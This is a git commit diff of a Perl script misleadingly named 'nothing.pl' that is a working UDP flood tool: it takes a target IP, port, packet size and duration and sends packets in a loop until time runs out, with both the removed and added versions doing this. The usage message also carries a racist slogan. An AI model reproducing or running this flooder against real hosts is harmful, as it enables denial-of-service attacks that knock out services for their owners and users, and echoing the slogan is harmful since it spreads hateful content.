ce0a6e3920dfc6a7ae65cc5975a96c345309891a
puttyserver <30303018+puttyserver@users.noreply.github.com>
2017-07-19 21:41:11 -0600

    Update nothing.pl

--- nothing.pl
+++ nothing.pl
@@ -1,59 +1,30 @@
 #!/usr/bin/perl
 
-##
-#!/usr/bin/perl
-
+#Args
+# 1 - IP
+# 2 - Port
+# 3 - Size of the packet to send
+# 4 - Time in seconds
+ 
 use Socket;
 use strict;
-
+ 
+if ($#ARGV != 3) {
+  print "-Bape Wars & Disbans No Africans : perl DDoS.pl 8.8.8.8 80 2048 500\n";
+  exit(1);
+}
+ 
 my ($ip,$port,$size,$time) = @ARGV;
-
 my ($iaddr,$endtime,$psize,$pport);
-
-$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
-$endtime = time() + ($time ? $time : 100);
+$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
+$endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
-
-
-print <<EOTEXT;
-
-
-
-               ...
-             ;::::;				This is Nothing No Worries!
-           ;::::; :;
-         ;:::::'   :;
-        ;:::::;     ;.
-       ,:::::'       ;           OOO\
-       ::::::;       ;          OOOOO\
-       ;:::::;       ;         OOOOOOOO
-      ,;::::::;     ;'         / OOOOOOO
-    ;:::::::::`. ,,,;.        /  / DOOOOOO
-  .';:::::::::::::::::;,     /  /     DOOOO
- ,::::::;::::::;;;;::::;,   /  /        DOOO
-;`::::::`'::::::;;;::::: ,#/  /          DOOO
-:`:::::::`;::::::;;::: ;::#  /            DOOO
-::`:::::::`;:::::::: ;::::# /              DOO
-`:`:::::::`;:::::: ;::::::#/               DOO
- :::`:::::::`;; ;:::::::::##                OO
- ::::`:::::::`;::::::::;:::#                OO
- `:::::`::::::::::::;'`:;::#                O
-  `:::::`::::::::;' /  / `:#
-   ::::::`:::::;'  /  /   `#
-EOTEXT
-
-print "~You are attacking the ip: $ip " . ($port ? $port : "random") . " With " .
-($size ? "$size-byte" : "Smacked With A Large Packets?") . " " .
-($time ? "for $time seconds" : "") . "\n";
-
+print "~To cancel the attack press \'Ctrl-C\'\n\n";
+print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
+print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
+print "To cancel the attack press 'Ctrl-C'\n" unless $time;
 for (;time() <= $endtime;) {
-$psize = $size ? $size : int(rand(1024-64)+64) ;
-$pport = $port ? $port : int(rand(65500))+1;
-
-send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
-$iaddr));}for (;time() <= $endtime;) {
-$psize = $size ? $size : int(rand(1024-64)+64) ;
-$pport = $port ? $port : int(rand(65500))+1;
-
-send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
-$iaddr));}
+  $psize = $size ? $size : int(rand(1500-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+ 
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
